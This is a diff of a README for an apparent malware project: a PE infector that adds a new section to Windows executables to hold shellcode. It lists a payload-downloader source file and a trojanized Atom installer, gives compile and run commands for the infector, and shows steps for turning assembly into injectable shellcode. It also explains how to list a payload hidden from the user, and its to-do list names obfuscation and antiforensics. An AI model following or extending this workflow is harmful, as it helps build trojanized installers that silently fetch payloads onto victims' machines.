@@ -3,11 +3,11 @@
 For the infection part we decided to use *New section* technique. This consits in adding a new section to a *.exe* file.
 
 For this, we have the following files:
-- infectPE.cpp
+- InfectPE.cpp
 - PE.cpp
 - PE.h
-- processCreator.cpp
-- shellcodeExecuter.cpp
+- payload_downloader.cpp -> code that after will become the shellcode that will be injected in a legitimate exe file
+- AtomSetup.exe -> The Atom installer infected
 
 ### Compilation
 
@@ -15,9 +15,15 @@ For this, we have the following files:
 Put the shellcode inside the infectPE.cpp.
 ```sh
 > g++ -c PE.cpp -std=c++17
-> g++ -c infectPE.cpp -std=c++17
-> g++ -o infectPE.exe infectPE.o PE.o
-> .\infectPE.exe .\executable_to_infect.exe .\out.exe
+> g++ -c InfectPE.cpp -std=c++17
+> g++ -o InfectPE.exe InfectPE.o PE.o
+> .\InfectPE.exe .\executable_to_infect.exe .\out.exe
+```
+
+#### List hidden payload
+To list the payload, which will be hidden from the user:
+```sh
+> dir /R
 ```
 
 #### Create shellcode
@@ -32,13 +38,13 @@ $ objcopy -j .text -O binary assembly_code.obj temp_file.bin
 $ hexdump -v -e '"\\" 1/1 "x%02x"' temp_file.bin
 ```
 
-#### Run sever
+#### Run server
 ```sh
 $ sudo node index.js
 ```
 
 ### To Do
-- [ ] Update downloaded file path and name
+- [X] Update downloaded file path and name
 - [ ] Payload of exe file
 - [ ] Obfuscation
 - [ ] Antiforensics
